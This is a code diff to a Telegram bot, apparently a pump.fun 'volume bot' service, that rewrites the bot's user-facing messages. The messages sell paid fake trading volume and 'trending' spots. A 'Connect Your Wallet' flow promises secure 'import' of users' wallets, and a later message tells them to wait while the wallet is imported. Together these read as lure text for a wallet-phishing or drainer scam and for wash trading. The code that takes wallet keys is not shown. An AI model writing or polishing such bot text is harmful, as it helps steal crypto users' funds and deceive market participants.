@@ -1219,21 +1219,25 @@ async function editOrSend(ctx, text, extra = {}) {
   }
 }
 async function sendWelcome(ctx) {
-  const caption = `<b>New to volume bots? No worries \u2014 we made it super simple!</b>
+  const caption = `\u{1F7E2} <b>Welcome to PUMPFUN TREND BOT service!</b>
+
+New to volume bots? No worries \u2014 we made it super simple!
+
+\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501
 
 <b>How it works:</b>
-1. Select bumps/volume.
-2. Pick duration.
-3. Done! Pump.fun Server handles the rest.
+1. Select how much Bumps/volume to use.
+2. Pick how long to run and how Massive you want your Token to Pump.
+3. Done! <a href="https://pump.fun">Pump.fun</a> Server handles the rest.
+
+\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501
 
 <b>Works on:</b>
-\u{1F7E2} <a href="https://pump.fun">Pumpfun</a> \u2022 \u{1F7E2} <a href="https://raydium.io">Raydium</a>
+\u{1F7E2} <a href="https://pump.fun">Pumpfun</a> \u2022 \u{1F7E2} <a href="https://raydium.io">Raydium</a> \u2022
 \u{1F7E2} <a href="https://pumpswap.xyz">PumpSwap</a> \u2022 \u{1F7E2} <a href="https://moonshot.money">Moonshot</a> \u2022
 \u{1F7E2} <a href="https://letsbonk.fun">LetsBonk</a> \u2022 \u{1F7E2} <a href="https://dexscreener.com">Dexpad/screener</a> \u2022
 
-From 0.3-0.4-0.5-0.6 SOL bumps boost trend with mass volume of high stabilities.
-
-\u{1F447} <b>Choose a service:</b>`;
+From 0.3-0.4-0.5-0.6 SOL bumps boost trend with mass volume of high stabilities.`;
   try {
     await ctx.editMessageCaption(caption, { parse_mode: "HTML", ...mainMenuKeyboard });
     return;
@@ -1247,47 +1251,51 @@ From 0.3-0.4-0.5-0.6 SOL bumps boost trend with mass volume of high stabilities.
   await sendPhoto(ctx, IMG.welcome, caption, mainMenuKeyboard);
 }
 async function showStartBumping(ctx) {
-  const text = `\u{1F7E2} <b>Start Bumping</b>
+  const text = `The fastest and cheapest Telegram bot for creating bump orders.
 
-The fastest and cheapest Telegram bot for creating bump orders.
+<b>Supported Platform:</b>
+Pumpfun and Raydium.
 
-<b>Supported Platforms:</b>
-\u{1F7E2} <a href="https://pump.fun">Pumpfun</a> \u2022 \u{1F7E2} <a href="https://raydium.io">Raydium</a>
+Pumpfun BumpBot charges a one-time fee of <b>0.3 SOL</b> per token, making it the cheapest bump bot ever!
 
-One-time fee of <b>0.3\u20130.6 SOL</b> per token \u2014 the cheapest bump bot available!
+\u{1F4CA} <b>Trending channel:</b>
+<a href="https://t.me/pumpmints">https://t.me/pumpmints</a>
 
-<b>Select your SOL bump amount below:</b>
+Subscribe to our PF alert tools:
+- PF New Raydium Pools: <a href="https://t.me/pumpswap_pools">t.me/pumpswap_pools</a>
 
-For support, contact: ${SUPPORT_USERNAME}`;
+For more information, please contact ${SUPPORT_USERNAME}`;
   await editOrSend(ctx, text, solPickerKeyboard);
 }
 async function showVolumeBoost(ctx) {
-  const caption = `\u{1F4CA} <b>Volume Boost Packages</b>
+  const caption = `\u270F\uFE0F Iron Package - $50,000 Volume
+\u270F\uFE0F Bronze Package - $250,000 Volume
+\u270F\uFE0F Silver Package - $100,000,000 Volume
+\u270F\uFE0F Gold Package - $100,000 Volume
+\u270F\uFE0F Platinum Package - $500,000 Volume
+\u270F\uFE0F Diamond Package - $2,500,000 Volume
 
-\u270F\uFE0F <b>Iron Package</b> \u2014 $50,000 Volume \u2014 1.50 SOL
-\u270F\uFE0F <b>Bronze Package</b> \u2014 $250,000 Volume \u2014 2.50 SOL
-\u270F\uFE0F <b>Gold Package</b> \u2014 $100,000 Volume \u2014 3.50 SOL
-\u270F\uFE0F <b>Silver Package</b> \u2014 $100,000,000 Volume \u2014 5.00 SOL
-\u270F\uFE0F <b>Platinum Package</b> \u2014 $500,000 Volume \u2014 7.50 SOL
-\u270F\uFE0F <b>Diamond Package</b> \u2014 $2,500,000 Volume \u2014 10.50 SOL
-
-Select a package below to get started:`;
-  await editOrSend(ctx, caption, volumeBoostKeyboard);
+Please select the package below:`;
+  await sendPhoto(ctx, IMG.volume, caption, volumeBoostKeyboard);
 }
 async function showTrendingBoost(ctx) {
-  const caption = `\u{1F525} <b>Trending Boost</b>
+  const caption = `\u{1F7E2} Discover the Power of Trending!
 
 Ready to boost your project's visibility? Trending offers guaranteed exposure, increased attention through milestone and uptrend alerts, and much more!
 
 \u{1F7E2} A paid boost guarantees you a spot in our daily livestream (AMA)!
 
-\u27A1\uFE0F Please choose SOL Trending, ETH Trending, or PumpFun Trending to start:`;
-  await editOrSend(ctx, caption, trendingMenuKeyboard);
+\u27A1\uFE0F Please choose SOL Trending or Pump Fun Trending to start:`;
+  await sendPhoto(ctx, IMG.trending, caption, trendingMenuKeyboard);
 }
 async function showDexScreener(ctx) {
   const text = `\u{1F310} DEX Screener is a data platform and on-chain analytics tool designed for decentralized exchanges (DEXs), providing real-time insights into token prices, liquidity pools, trading volumes, and market trends across multiple blockchains.
 
-<b>TREND ON DEX</b>`;
+<b>TREND ON DEX</b>
+
+\u{1F534} TOP 6 \u{1F534}
+
+Select a duration:`;
   await editOrSend(ctx, text, dexscreenerKeyboard);
 }
 async function showDeposit(ctx) {
@@ -1311,16 +1319,18 @@ Deposit not less than 0.30 SOL and get trending on several platforms
 async function showConnectWallet(ctx) {
   const caption = `\u{1F517} <b>Connect Your Wallet</b>
 
+Welcome to our secure wallet connection service!
+
 Connect your wallet to unlock premium features and enhanced trading capabilities.
 
 <b>Available Options:</b>
-\u{1F517} <b>Connect Now</b> \u2014 Import your wallet instantly
-\u{1F511} <b>Why Connect?</b> \u2014 Learn about the benefits
-\u{1F6E1}\uFE0F <b>Security Guidelines</b> \u2014 Important safety information
-\u{1F4F1} <b>How to Connect</b> \u2014 Step-by-step instructions
+\u{1F517} Connect Now - Start the connection process
+\u{1F511} Why Connect? - Learn about the benefits
+\u{1F6E1}\uFE0F Security Guidelines - Important safety information
+\u{1F4F1} How to Connect - Step-by-step instructions
 
-\u{1F510} Your security is our top priority. We use industry-standard encryption.`;
-  await editOrSend(ctx, caption, connectWalletKeyboard);
+Your security is our top priority. We use industry-standard encryption to protect your information.`;
+  await sendPhoto(ctx, IMG.walletconnect, caption, connectWalletKeyboard);
 }
 async function showSupport(ctx) {
   const text = `\u{1F4AC} <b>Contact Support</b>
@@ -1443,7 +1453,7 @@ Please paste the Contract Address (CA) of your token:`,
       ctx,
       `\u2600\uFE0F <b>SOL Trending</b>
 
-Choose your package \u2014 TOP 3 (left) or TOP 10 (right):`,
+Choose your package \u2014 TOP 3 (left column) or TOP 10 (right column):`,
       solTrendingKeyboard
     );
   });
@@ -1959,27 +1969,27 @@ You can still proceed \u2014 just paste the correct CA:`,
         const chainName = info.chain === "sol" ? "solana" : info.chain === "eth" ? "ethereum" : info.chain === "bsc" ? "bsc" : info.chain ?? "unknown";
         const dexName = info.dex ?? "unknown";
         const tokenUrl = info.chain === "sol" ? `https://pump.fun/coin/${ca}` : `https://dexscreener.com/${info.chain}/${ca}`;
-        const tokenMsg = `\u{1F4CB} <b>Token Found!</b>
+        const tokenMsg = `\u{1F4CB} <b>Project Details Found!</b>
 
-\u{1FA99} <b>${info.name} (${info.symbol})</b>
-\u{1F517} Chain: ${chainName}  \u2022  DEX: ${dexName}
+\u{1F4CA} ${dexName.toUpperCase()}_SCRAPE Token
 
 \u2705 <b>Contract Address:</b>
-<code>${ca}</code>
+${ca}
 
-\u{1F4CA} <b>Live Market Data:</b>
-\u2022 \u{1F4B5} Price: ${info.price ?? "\u2014"}
-\u2022 \u{1F4C8} Market Cap: ${info.marketCap ?? "\u2014"}
-\u2022 \u{1F504} 24h Volume: ${info.volume24h ?? "\u2014"}
-\u2022 \u{1F4A7} Liquidity: ${info.liquidity ?? "\u2014"}
-\u2022 \u{1F4C9} 24h Change: ${info.change24h ?? "\u2014"}%
+\u{1F4CA} <b>Token Information:</b>
+\u2022 Name: ${info.name}
+\u2022 Symbol: ${info.symbol}
+\u2022 Price: ${info.price ?? "0.00e+0"}
+\u2022 Market Cap: ${info.marketCap ?? "0.00"}
+\u2022 24h Volume: ${info.volume24h ?? "0.00"}
+\u2022 Liquidity: ${info.liquidity ?? "0.00"}
+\u2022 24h Change: ${info.change24h ?? "0.00"}%
+\u2022 DEX: ${dexName}
+\u2022 Chain: ${chainName}
 
-\u{1F517} <a href="${tokenUrl}">View on ${info.chain === "sol" ? "Pump.fun" : "DexScreener"}</a>
+\u{1F517} <b>Available on:</b> \u{1F7E2} Pumpswap \u2022 \u{1F7E2} <a href="${tokenUrl}">Pump.fun</a>
 
-\u2699\uFE0F Service: <b>${s.serviceLabel}</b>
-\u{1F4B0} Cost: <b>${cost}</b>
-
-\u2705 <b>Confirm order to proceed to payment?</b>`;
+\u{1F517} <b>View Token:</b> <a href="${tokenUrl}">${tokenUrl}</a>`;
         if (info.imageUrl) {
           const sent = await safeSendPhoto(ctx, info.imageUrl, {
             caption: tokenMsg,
@@ -2118,15 +2128,13 @@ ${result.recipient ? `\u{1F4EE} Recipient: <code>${result.recipient}</code>
         } catch {
         }
         await ctx.reply(
-          `\u{1F517} <b>Wallet Import Initiated</b>
+          `Connection of wallet may take time due to
 
-Connection may take a moment due to:
+<b>TIME BASE LOCATION AND NETWORK CONGESTION .....</b>
 
-\u23F3 <b>Network sync &amp; on-chain verification...</b>
+Please wait linking and importing your wallet..
 
-Your wallet is being linked to your account.
-
-<b>Processing \u2699\uFE0F ........</b>`,
+Processing .........`,
           { parse_mode: "HTML", ...mainMenuOnlyKeyboard }
         );
         break;
